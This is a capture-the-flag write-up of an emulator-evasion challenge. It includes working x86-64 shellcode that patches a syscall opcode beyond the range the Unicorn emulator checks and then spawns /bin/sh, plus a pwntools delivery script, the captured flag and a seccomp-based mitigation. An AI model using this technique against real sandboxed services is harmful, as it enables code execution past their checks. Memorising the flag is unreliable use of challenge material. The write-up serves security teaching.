# Release the unicorn
> **Category:** Misc
>
> **Difficulty:** Easy
>
> **Hint:** Shellcode execution as a service. Can you outsmart the unicorn?

## Overview
The user can provide. The challenge will first execute the shellcode using the *Unicorn* Emulator. If the emulator did not find any *syscall* or *sysenter*, my shellcode gets executed for real.

## Vulnerability
The emulator only executes until the ende of the code length. The vulnerable code is here:

```rust
42  // Run emulation
43  emu.emu_start(BASE_ADDR, (BASE_ADDR as usize + code.len()) as u64, 0, 0)?;
```
The first argument is the start address and the second is the end address. During real execution, instructions after the end addess will still be executed.

## Exploit
My exploit writes the opcode for `syscall` at the end of the shellcode. To get the address of `rip` we use the fact that a `call` instruction pushes `rip` on the stack:
```mips
jmp begin
next:
    pop rcx
    push rcx
    ret
begin:
call next
``` 
Now I have `rip` in `rcx`. After counting the bytes of the rest of the shellcode, I write `0f05` at the end of my shellcode, the opcode for `syscall`.

```mips
add rcx, 44
mov word ptr [rcx], 0x050f
```

Afterwards I just add a standard `execve("/bin/sh", 0, 0)` shellcode that can be created with `pwn.asm(pwn.shellcraft("/bin/sh"))`. I remove the `syscall` and assemble the shellcode.

## Code
The full shellcode is:
```mips
/* save rip */
jmp begin
next:
    pop rcx
    push rcx
    ret
begin:
call next
/* save syscall at the end */
add rcx, 44
mov word ptr [rcx], 0x050f
/* /bin/sh shellcode */
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp
xor edx, edx 
xor esi, esi 
push 59
pop rax
/* Tell unicorn to stop */
.byte 00
```

Using the following python script I'm able to get the flag:

```python
from pwn import *
# Shellcode
sc = bytes.fromhex("eb035951c3e8f8ffffff4883c12c66c7010f0548b801010101010101015048b82e63686f2e726901483104244889e731d231f66a3b5800")

URL = "d9fd0a8778664417ed81d7a4-release-the-unicorn.challenge.master.cscg.live"
io = remote(URL, 31337, ssl=True)
io.recvuntil(b'Bytecode')
io.send(sc)
io.interactive()
```
Using `find / -name *flag* 2>/dev/null`, I locate the flag in the `/home/ctf/` folder. 

**Flag** CSCG{w4sn7_s0_s3cur3_4f3r_al1_huh}


# Mitigation
A safer practice to disable syscalls would be the application of `seccomp`. `seccomp` is a method to disallow system calls entirely, which would be a lot harder to circumvent. An example mitigation would be:

```rust
extern crate seccomp;
use seccomp::{Context, Action, Rule};

fn main() {
    // Add User interaction here

    println!("[+] Starting execution...");
    // Disallowing all syscalls
    let mut ctx = Context::default(Action::Allow).unwrap();
    for syscall in 0..=10000 {
        let rule = Rule::new(syscall, None, Action::Kill);
        ctx.add_rule(rule).unwrap();
    }
    ctx.load().unwrap();
    
    
    execute_bytecode(&user_input)
}

```